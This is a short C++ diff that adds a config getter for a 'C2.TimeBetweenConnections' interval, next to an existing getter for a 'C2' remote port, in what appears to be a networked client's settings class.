@@ -40,6 +40,11 @@ public:
         return pLocalConfig.get<bool>("Logs.Debug",false);
     }
 
+    static uint16_t getLC_C2TimeBetweenConnections()
+    {
+        return pLocalConfig.get<uint16_t>("C2.TimeBetweenConnections",15);
+    }
+
     static uint16_t getLC_C2RemotePort()
     {
         return pLocalConfig.get<uint16_t>("C2.RemotePort",37001);
